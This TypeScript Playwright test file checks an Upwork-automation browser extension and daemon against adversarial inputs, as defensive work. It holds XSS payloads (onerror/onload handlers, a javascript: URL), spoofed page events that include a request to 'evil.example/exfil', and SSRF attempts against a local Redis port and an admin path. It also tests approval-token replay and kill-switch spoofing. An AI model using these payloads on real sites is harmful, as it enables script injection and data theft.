import { type McpToolCallResult, parseMcpToolJson } from '../helpers/mcp-client.ts';
import { expect, test } from '../helpers/test-fixtures.ts';

interface ApiJob {
  id: number;
  upwork_job_id?: string;
  last_enriched_at?: string | null;
}

interface ApiProposal {
  id: number;
  status: string;
  approval_token?: string;
}

async function callToolSafely(
  fn: () => Promise<McpToolCallResult>,
): Promise<{ ok: boolean; errorText: string; result?: McpToolCallResult }> {
  try {
    const res = await fn();
    const text = res.content.map((c) => c.text ?? '').join('\n');
    if (res.isError) {
      return { ok: false, errorText: text, result: res };
    }
    return { ok: true, errorText: text, result: res };
  } catch (err) {
    return { ok: false, errorText: err instanceof Error ? err.message : String(err) };
  }
}

test.describe('Tier 5 — Adversarial Security, Concurrency & Challenge Regression', () => {
  test('E2E-1: Stored XSS & javascript: URL neutralization in Side Panel Pipeline & Approvals', async ({
    pairedExtension,
    daemon,
    extPages,
    workerDb,
  }) => {
    const xssTitle = '<img src=x onerror="window.__xss=1">XSS Senior Go Job';
    const xssDesc = '<svg onload="window.__xss=2">Malicious Job Description</svg>';
    const jobRes = await daemon.apiFetch('/api/jobs', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        upwork_job_id: '~055500000000000000001',
        job_title: xssTitle,
        job_description: xssDesc,
        url: 'https://www.upwork.com/jobs/~055500000000000000001/',
        attachments: [{ name: 'payload.pdf', url: 'javascript:window.__xss=3' }],
      }),
    });
    expect(jobRes.ok).toBe(true);
    const savedJob = (await jobRes.json()) as { id: number };

    const propRes = await daemon.apiFetch('/api/proposals', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        job_id: savedJob.id,
        upwork_job_id: '~055500000000000000001',
        cover_letter: 'Cover letter with <img src=x onerror="window.__xss=4">',
        bid_type: 'fixed',
        bid_amount: 1200,
        status: 'pending_approval',
      }),
    });
    expect(propRes.status).toBe(201);
    const propJson = (await propRes.json()) as { proposal: ApiProposal };

    // Inject hostile HTML strings directly into verification_snapshot_json to exercise renderSnapshotHtml escaping
    const hostileSnapshot = JSON.stringify({
      cover_letter_length: 48,
      estimated_fee: '<img src=x onerror="window.__xss=5">',
      estimated_net: '<svg onload="window.__xss=6">',
      rate_increase: '<img src=y onerror="window.__xss=7">',
      unanswered_required_questions: 0,
      screening_answers: [
        {
          index: 0,
          prompt: '<svg onload="window.__xss=8">',
          answer: '<img src=z onerror="window.__xss=9">',
          required: true,
        },
      ],
    });
    await workerDb.query('UPDATE proposals SET verification_snapshot_json = $1 WHERE id = $2', [
      hostileSnapshot,
      propJson.proposal.id,
    ]);

    const sidePanel = await extPages.openSidePanel();
    const dialogs: string[] = [];
    const pageErrors: string[] = [];
    sidePanel.on('dialog', (d) => {
      dialogs.push(d.message());
      void d.dismiss();
    });
    sidePanel.on('pageerror', (err) => {
      pageErrors.push(err.message);
    });

    try {
      // 1. Inspect Pipeline tab and job detail drawer
      const pipelineCard = sidePanel.locator('.sp-card', { hasText: 'XSS Senior Go Job' }).first();
      await expect(pipelineCard).toBeVisible({ timeout: 15_000 });
      await pipelineCard.click();

      const xssFlagPipeline = await sidePanel.evaluate(
        () => (window as unknown as { __xss?: unknown }).__xss,
      );
      expect(xssFlagPipeline).toBeUndefined();
      expect(
        await sidePanel.locator('#sidepanel-content img, #sidepanel-content svg').count(),
      ).toBe(0);
      expect(await sidePanel.locator('a[href^="javascript:"]').count()).toBe(0);

      // 2. Switch to Approvals tab and verify verification_snapshot_json rendering is escaped
      await sidePanel.locator('[data-testid="tab-approvals"]').click();
      await expect(sidePanel.locator('[data-testid="approve-submit-btn"]').first()).toBeVisible({
        timeout: 15_000,
      });

      const xssFlagApprovals = await sidePanel.evaluate(
        () => (window as unknown as { __xss?: unknown }).__xss,
      );
      expect(xssFlagApprovals).toBeUndefined();
      expect(
        await sidePanel.locator('#sidepanel-content img, #sidepanel-content svg').count(),
      ).toBe(0);
      const approvalsText = (await sidePanel.locator('#sidepanel-content').textContent()) ?? '';
      expect(approvalsText).toContain('<img src=x onerror=');
      expect(dialogs).toEqual([]);
      expect(pageErrors).toEqual([]);
    } finally {
      await sidePanel.close();
    }

    expect(pairedExtension.errors).toEqual([]);
  });

  test('E2E-2: MAIN-world CustomEvent command spoofing & cyclic payload DoS resistance', async ({
    pairedExtension,
    daemon,
    extPages,
    upworkPage,
    mcpHttp,
  }) => {
    await upworkPage.goto('https://www.upwork.com/nx/search/jobs/?q=react', {
      waitUntil: 'domcontentloaded',
    });

    const toolbarHost = extPages.getShadowToolbar(upworkPage);
    await expect(toolbarHost).toBeAttached({ timeout: 15_000 });

    // Dispatch spoofed commands & cyclic payload from MAIN-world page context
    await upworkPage.evaluate(() => {
      window.dispatchEvent(
        new CustomEvent('upwork-buddy:passive-tap', {
          detail: {
            type: 'TRIGGER_KILL_SWITCH',
            reason: 'hijack-from-main-world',
            kind: 'graphql',
            url: 'https://www.upwork.com/api/graphql/v1',
            data: { spoofed: true },
            capturedAt: new Date().toISOString(),
          },
        }),
      );
      window.dispatchEvent(
        new CustomEvent('upwork-buddy:passive-tap', {
          detail: {
            type: 'API_PROXY_REQUEST',
            url: 'https://evil.example/exfil',
            method: 'GET',
            kind: 'xhr',
            capturedAt: new Date().toISOString(),
          },
        }),
      );
      const cyclic: Record<string, unknown> = { ok: 1 };
      cyclic.self = cyclic;
      window.dispatchEvent(
        new CustomEvent('upwork-buddy:passive-tap', {
          detail: {
            kind: 'graphql',
            url: 'https://www.upwork.com/api/graphql/v1',
            data: cyclic,
            capturedAt: new Date().toISOString(),
          },
        }),
      );
    });

    // Give runtime message queue a moment to settle
    await upworkPage.waitForTimeout(250);

    const policyRes = await daemon.apiFetch('/api/policy');
    expect(policyRes.ok).toBe(true);
    const policyBody = (await policyRes.json()) as {
      mode: string;
      kill_switch_active: boolean;
    };
    expect(policyBody.kill_switch_active).toBe(false);
    expect(policyBody.mode).toBe('confirm_in_ui');

    const statusRes = await daemon.apiFetch('/api/session/status');
    const statusBody = (await statusRes.json()) as { extension_connected: boolean };
    expect(statusBody.extension_connected).toBe(true);

    // Content script must still be healthy and execute legitimate search RPC
    const searchRes = await mcpHttp.callTool('upwork_search_jobs', {
      source: 'search',
      query: 'react',
      max_pages: 1,
    });
    expect(searchRes.isError).not.toBe(true);
    expect(pairedExtension.errors).toEqual([]);
  });

  test('E2E-3: approval_token replay after UI reject & concurrent double-approve race', async ({
    pairedExtension,
    mcpHttp,
    mockClient,
    daemon,
    extPages,
  }) => {
    const jobRes = await mcpHttp.callTool('upwork_get_job_details', {
      url: 'https://www.upwork.com/jobs/~022115332344639171/',
    });
    expect(jobRes.isError).not.toBe(true);

    // 1. Draft & fill proposal A, capture approval_token, reject via Side Panel UI
    const draftA = parseMcpToolJson<{ proposal?: ApiProposal; id?: number }>(
      await mcpHttp.callTool('upwork_draft_proposal', {
        job_id: '~022115332344639171',
        cover_letter: 'Proposal A for reject + replay verification.',
        bid_type: 'fixed',
        bid_amount: 1400,
        screening_answers: ['10 years', '35 hrs/week'],
        boost_connects: 0,
      }),
    );
    const propAId = draftA.proposal?.id ?? draftA.id;
    expect(propAId).toBeTruthy();

    const fillA = parseMcpToolJson<{ approval_token?: string }>(
      await mcpHttp.callTool('upwork_fill_proposal_form', { proposal_id: propAId }),
    );
    const capturedTokenA = fillA.approval_token;
    expect(capturedTokenA).toBeTruthy();

    const sidePanel = await extPages.openSidePanel();
    try {
      await sidePanel.locator('[data-testid="tab-approvals"]').click();
      const rejectBtn = sidePanel.locator('[data-testid="reject-proposal-btn"]').first();
      await expect(rejectBtn).toBeVisible({ timeout: 15_000 });
      await rejectBtn.click();
      await expect(sidePanel.getByText(/rejected/i).first()).toBeVisible({ timeout: 10_000 });
    } finally {
      await sidePanel.close();
    }

    // Replay captured token from rejected proposal -> must fail 403/409 with 0 mock submissions
    const replayRes = await daemon.apiFetch(`/api/proposals/${propAId}/submit`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ approval_token: capturedTokenA }),
    });
    expect([403, 409]).toContain(replayRes.status);
    expect((await mockClient.getState()).submittedProposals).toHaveLength(0);

    // 2. Draft & fill proposal B, then fire two concurrent approve calls -> exactly 1 wins
    const draftB = parseMcpToolJson<{ proposal?: ApiProposal; id?: number }>(
      await mcpHttp.callTool('upwork_draft_proposal', {
        job_id: '~022115332344639171',
        cover_letter: 'Proposal B for concurrent double-approve race verification.',
        bid_type: 'fixed',
        bid_amount: 1500,
        screening_answers: ['10 years', '35 hrs/week'],
        boost_connects: 0,
      }),
    );
    const propBId = draftB.proposal?.id ?? draftB.id;
    expect(propBId).toBeTruthy();

    await mcpHttp.callTool('upwork_fill_proposal_form', { proposal_id: propBId });

    const [res1, res2] = await Promise.all([
      daemon.apiFetch(`/api/proposals/${propBId}/approve`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: '{}',
      }),
      daemon.apiFetch(`/api/proposals/${propBId}/approve`, {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: '{}',
      }),
    ]);

    const statuses = [res1.status, res2.status].sort((a, b) => a - b);
    expect(statuses[0]).toBe(200);
    expect([403, 409]).toContain(statuses[1]);
    expect((await mockClient.getState()).submittedProposals).toHaveLength(1);
    expect(pairedExtension.errors).toEqual([]);
  });

  test('E2E-4: Stage 3 detail enrichment & post-submit HUMAN_ACTION_REQUIRED challenge halts', async ({
    pairedExtension,
    mcpHttp,
    mockClient,
    daemon,
  }) => {
    // Part A: Stage 3 jobs.detail challenge on 2nd job preserves Stage 2 jobs and halts immediately
    await mockClient.setScenario({
      challenge: 'cloudflare',
      challengeOnPath: '/jobs/.*~040200000000000000002',
    });

    const haltedSearch = await callToolSafely(() =>
      mcpHttp.callTool('upwork_search_jobs', {
        source: 'search',
        query: 'react',
        max_pages: 1,
        enrich_top_n: 2,
      }),
    );
    expect(haltedSearch.ok).toBe(false);
    expect(haltedSearch.errorText).toContain('HUMAN_ACTION_REQUIRED');

    // Stage 2 leads must remain persisted in Postgres (BUG-05 fix), without Stage 3 detail enrichment persisted
    const jobsRes = await daemon.apiFetch('/api/jobs');
    const jobsBody = (await jobsRes.json()) as { jobs: ApiJob[] };
    const stage2First = jobsBody.jobs.find((j) => j.upwork_job_id === '~040200000000000000001');
    const stage2Second = jobsBody.jobs.find((j) => j.upwork_job_id === '~040200000000000000002');
    expect(stage2First).toBeDefined();
    expect(stage2Second).toBeDefined();
    expect(stage2First?.last_enriched_at ?? null).toBeNull();

    // Part B: Post-submit redirect to login wall returns HUMAN_ACTION_REQUIRED (never phantom submitted)
    await mockClient.reset();

    await mcpHttp.callTool('upwork_get_job_details', {
      url: 'https://www.upwork.com/jobs/~022115332344639171/',
    });
    const draft = parseMcpToolJson<{ proposal?: ApiProposal; id?: number }>(
      await mcpHttp.callTool('upwork_draft_proposal', {
        job_id: '~022115332344639171',
        cover_letter: 'Proposal testing post-submit login redirect challenge halt.',
        bid_type: 'fixed',
        bid_amount: 1400,
        screening_answers: ['10 years', '35 hrs/week'],
        boost_connects: 0,
      }),
    );
    const propId = draft.proposal?.id ?? draft.id;
    expect(propId).toBeTruthy();

    const fillOut = parseMcpToolJson<{ approval_token?: string }>(
      await mcpHttp.callTool('upwork_fill_proposal_form', { proposal_id: propId }),
    );
    expect(fillOut.approval_token).toBeTruthy();

    // Redirect confirmation page to login wall
    await mockClient.setScenario({
      challenge: 'login',
      challengeOnPath: '/nx/proposals/confirmation/',
    });

    const submitRes = await callToolSafely(() =>
      mcpHttp.callTool('upwork_submit_proposal', {
        proposal_id: propId,
        approval_token: fillOut.approval_token,
      }),
    );
    expect(submitRes.ok).toBe(false);
    expect(submitRes.errorText).toContain('HUMAN_ACTION_REQUIRED');
    expect(submitRes.errorText).not.toContain('PROPOSAL_SUBMIT_UNCONFIRMED');

    const afterPropRes = await daemon.apiFetch(`/api/proposals/${propId}`);
    const afterProp = (await afterPropRes.json()) as { proposal?: ApiProposal; status?: string };
    expect(afterProp.proposal?.status ?? afterProp.status).not.toBe('submitted');
    const unexpectedErrors = pairedExtension.errors.filter(
      (e) =>
        !(
          e.message.includes('403 (Forbidden)') && (e.url ?? '').includes('~040200000000000000002')
        ),
    );
    expect(unexpectedErrors).toEqual([]);
  });

  test('E2E-5: /ab/messages/rooms/ trailing-slash drift audit & API_PROXY_REQUEST SSRF block', async ({
    pairedExtension,
    mcpHttp,
    daemon,
    extPages,
  }) => {
    // Part A: Trailing-slash /ab/messages/rooms/ infers messages_rooms consistently
    const auditRes = await mcpHttp.callTool('upwork_audit_selectors', {
      url: 'https://www.upwork.com/ab/messages/rooms/',
    });
    expect(auditRes.isError).not.toBe(true);
    const auditJson = parseMcpToolJson<{
      report?: { view_type?: string };
      blueprint?: { view_type?: string };
    }>(auditRes);
    expect(auditJson.report?.view_type).toBe('messages_rooms');
    expect(auditJson.blueprint?.view_type).toBe('messages_rooms');

    const storedRes = await daemon.apiFetch('/api/selector-audits?view_type=messages_rooms');
    expect(storedRes.ok).toBe(true);
    const storedBody = (await storedRes.json()) as {
      audits: Array<{ view_type?: string; url?: string }>;
    };
    expect(storedBody.audits.some((a) => a.view_type === 'messages_rooms')).toBe(true);

    // Part B: Extension API_PROXY_REQUEST rejects cross-origin SSRF, non-daemon ports, and non-API paths
    const optionsPage = await extPages.openOptions();
    try {
      const ssrfResults = await optionsPage.evaluate(async () => {
        const runtime = (
          globalThis as unknown as {
            chrome: { runtime: { sendMessage: (msg: unknown) => Promise<unknown> } };
          }
        ).chrome.runtime;
        const send = (url: string) =>
          runtime.sendMessage({
            type: 'API_PROXY_REQUEST',
            url,
            method: 'GET',
          }) as Promise<{ ok: boolean; status: number; error?: string }>;
        return Promise.all([
          send('https://evil.example/api/leak'),
          send('http://127.0.0.1:6379/keys'),
          send('/admin/shutdown'),
        ]);
      });

      for (const r of ssrfResults) {
        expect(r.ok).toBe(false);
        expect(r.status).toBe(0);
        expect(r.error).toMatch(/cross-origin|allowed daemon paths/i);
      }
    } finally {
      await optionsPage.close();
    }

    expect(pairedExtension.errors).toEqual([]);
  });

  test('E2E-6: Pending-approval proposal mutation invalidates approval_token & Shadow DOM capture remains scoped', async ({
    pairedExtension,
    mcpHttp,
    mockClient,
    daemon,
    extPages,
    upworkPage,
  }) => {
    await mcpHttp.callTool('upwork_get_job_details', {
      url: 'https://www.upwork.com/jobs/~022115332344639171/',
    });

    const draft = parseMcpToolJson<{ proposal?: ApiProposal; id?: number }>(
      await mcpHttp.callTool('upwork_draft_proposal', {
        job_id: '~022115332344639171',
        cover_letter: 'Original reviewed cover letter.',
        bid_type: 'fixed',
        bid_amount: 1400,
        screening_answers: ['10 years', '35 hrs/week'],
      }),
    );
    const propId = draft.proposal?.id ?? draft.id;
    expect(propId).toBeTruthy();

    const fillRes = parseMcpToolJson<{ approval_token?: string }>(
      await mcpHttp.callTool('upwork_fill_proposal_form', { proposal_id: propId }),
    );
    const originalToken = fillRes.approval_token;
    expect(originalToken).toBeTruthy();

    // Mutate cover_letter via POST /api/proposals -> must demote to draft & invalidate originalToken
    const mutateRes = await daemon.apiFetch('/api/proposals', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({
        id: propId,
        upwork_job_id: '~022115332344639171',
        cover_letter: 'Tampered cover letter after fill snapshot.',
        bid_type: 'fixed',
        bid_amount: 1400,
        status: 'pending_approval',
      }),
    });
    expect(mutateRes.ok).toBe(true);
    const mutatedJson = (await mutateRes.json()) as { proposal?: ApiProposal };
    expect(mutatedJson.proposal?.status).toBe('draft');
    expect(mutatedJson.proposal?.approval_token ?? '').toBe('');

    const replayRes = await daemon.apiFetch(`/api/proposals/${propId}/submit`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ approval_token: originalToken }),
    });
    expect([403, 409]).toContain(replayRes.status);
    expect((await mockClient.getState()).submittedProposals).toHaveLength(0);

    // Extension UI (optionsPage) retains privileged /api/policy read access through API_PROXY_REQUEST
    const optionsPage = await extPages.openOptions();
    try {
      const uiProxyRes = await optionsPage.evaluate(async () => {
        const runtime = (
          globalThis as unknown as {
            chrome: { runtime: { sendMessage: (msg: unknown) => Promise<unknown> } };
          }
        ).chrome.runtime;
        return (await runtime.sendMessage({
          type: 'API_PROXY_REQUEST',
          url: '/api/policy',
          method: 'GET',
        })) as { ok: boolean; status: number };
      });
      expect(uiProxyRes.ok).toBe(true);
      expect(uiProxyRes.status).toBe(200);
    } finally {
      await optionsPage.close();
    }

    // Shadow DOM toolbar Save Job on Upwork still succeeds through scoped content-script API_PROXY_REQUEST
    await upworkPage.goto('https://www.upwork.com/jobs/~022115332344639180/', {
      waitUntil: 'domcontentloaded',
    });
    const toolbarHost = extPages.getShadowToolbar(upworkPage);
    await expect(toolbarHost).toBeAttached({ timeout: 15_000 });
    await toolbarHost.locator('[data-testid="toolbar-save-btn"]').click();

    await expect
      .poll(
        async () => {
          const res = await daemon.apiFetch('/api/jobs');
          if (!res.ok) return false;
          const body = (await res.json()) as { jobs: ApiJob[] };
          return body.jobs.some((j) => j.upwork_job_id === '~022115332344639180');
        },
        { timeout: 15_000 },
      )
      .toBe(true);

    expect(pairedExtension.errors).toEqual([]);
  });

  test('E2E-7: Kill switch recovery clears killSwitchActive & 2FA/login query params do not false-positive HUMAN_ACTION_REQUIRED', async ({
    pairedExtension,
    mcpHttp,
    extPages,
  }) => {
    // Part A: Activate Kill Switch via extension UI command, then recover via PUT /api/policy through API_PROXY_REQUEST
    const optionsPage = await extPages.openOptions();
    try {
      const afterKill = await optionsPage.evaluate(async () => {
        const runtime = (
          globalThis as unknown as {
            chrome: { runtime: { sendMessage: (msg: unknown) => Promise<unknown> } };
          }
        ).chrome.runtime;
        await runtime.sendMessage({
          type: 'TRIGGER_KILL_SWITCH',
          reason: 'e2e7-recovery-check',
        });
        return (await runtime.sendMessage({ type: 'GET_RUNTIME_STATUS' })) as {
          killSwitchActive: boolean;
          policyMode: string;
        };
      });
      expect(afterKill.killSwitchActive).toBe(true);
      expect(afterKill.policyMode).toBe('draft_only');

      const afterRecover = await optionsPage.evaluate(async () => {
        const runtime = (
          globalThis as unknown as {
            chrome: { runtime: { sendMessage: (msg: unknown) => Promise<unknown> } };
          }
        ).chrome.runtime;
        const putRes = (await runtime.sendMessage({
          type: 'API_PROXY_REQUEST',
          url: '/api/policy',
          method: 'PUT',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ mode: 'confirm_in_ui' }),
        })) as { ok: boolean; status: number };
        const runtimeStatus = (await runtime.sendMessage({ type: 'GET_RUNTIME_STATUS' })) as {
          killSwitchActive: boolean;
          policyMode: string;
        };
        return { putRes, runtimeStatus };
      });
      expect(afterRecover.putRes.ok).toBe(true);
      expect(afterRecover.runtimeStatus.killSwitchActive).toBe(false);
      expect(afterRecover.runtimeStatus.policyMode).toBe('confirm_in_ui');
    } finally {
      await optionsPage.close();
    }

    // Part B: Search for ?q=2fa and job detail slug with 2FA + ?referrer_url_path=/ab/account-security/login must not trigger HUMAN_ACTION_REQUIRED
    const search2fa = await mcpHttp.callTool('upwork_search_jobs', {
      source: 'search',
      query: '2fa',
      max_pages: 1,
    });
    expect(search2fa.isError).not.toBe(true);

    const detail2fa = await mcpHttp.callTool('upwork_get_job_details', {
      url: 'https://www.upwork.com/jobs/Implement-2FA-in-React_~022115332344639171/?referrer_url_path=/ab/account-security/login',
    });
    expect(detail2fa.isError).not.toBe(true);

    expect(pairedExtension.errors).toEqual([]);
  });

  test('E2E-8: Logged-in challenge-phrase job enriches cleanly & message send Cloudflare redirect halts with HUMAN_ACTION_REQUIRED preserving draft', async ({
    pairedExtension,
    mcpHttp,
    mockClient,
    daemon,
  }) => {
    // Part (a): Logged-in job detail page containing "two-step verification" & "security check" in <h1>/<main> must NOT false-positive HUMAN_ACTION_REQUIRED
    const detailRes = await mcpHttp.callTool('upwork_get_job_details', {
      url: 'https://www.upwork.com/jobs/Senior-Auth-Engineer-Two-Step-Verification-Security-Check_~055500000000000000002/',
    });
    expect(detailRes.isError).not.toBe(true);
    const jobsRes = await daemon.apiFetch('/api/jobs');
    expect(jobsRes.ok).toBe(true);
    const jobsBody = (await jobsRes.json()) as {
      jobs: Array<ApiJob & { job_title?: string; title?: string }>;
    };
    const enrichedJob = jobsBody.jobs.find((j) => j.upwork_job_id === '~055500000000000000002');
    expect(enrichedJob).toBeDefined();
    expect(enrichedJob?.last_enriched_at).toBeTruthy();
    const enrichedTitle = enrichedJob?.job_title ?? enrichedJob?.title ?? '';
    expect(enrichedTitle).toContain('Two-Step Verification');

    // Part (b): upwork_send_message redirected to Cloudflare challenge returns HUMAN_ACTION_REQUIRED (not MESSAGE_SEND_UNCONFIRMED) and preserves draft
    const draftMsg = parseMcpToolJson<{
      message?: { id?: number; status?: string };
      approval_token?: string;
    }>(
      await mcpHttp.callTool('upwork_draft_message', {
        room_id: 'room_alpha',
        body: 'Testing Cloudflare redirect preservation.',
        prefill_composer: false,
      }),
    );
    const draftId = draftMsg.message?.id;
    const approvalToken = draftMsg.approval_token;
    expect(draftId).toBeTruthy();
    expect(approvalToken).toBeTruthy();

    await mockClient.setScenario({
      challenge: 'cloudflare',
      challengeOnPath: '/api/mock/messages/',
    });

    const sendRes = await callToolSafely(() =>
      mcpHttp.callTool('upwork_send_message', {
        room_id: 'room_alpha',
        message_id: draftId,
        approval_token: approvalToken,
      }),
    );
    expect(sendRes.ok).toBe(false);
    expect(sendRes.errorText).toContain('HUMAN_ACTION_REQUIRED');
    expect(sendRes.errorText).not.toContain('MESSAGE_SEND_UNCONFIRMED');

    // Draft must remain pending_approval (NOT failed) and must not appear in mock room history
    const draftsRes = await daemon.apiFetch('/api/messages/drafts?status=pending_approval');
    expect(draftsRes.ok).toBe(true);
    const draftsJson = (await draftsRes.json()) as {
      drafts: Array<{ id: number; status: string; approval_token?: string }>;
    };
    const preserved = draftsJson.drafts.find((d) => d.id === draftId);
    expect(preserved).toBeDefined();
    expect(preserved?.status).toBe('pending_approval');

    const mockState = await mockClient.getState();
    const roomMsgs = mockState.rooms.room_alpha?.messages ?? [];
    expect(roomMsgs.some((m) => m.body === 'Testing Cloudflare redirect preservation.')).toBe(
      false,
    );

    expect(pairedExtension.errors).toEqual([]);
  });
});
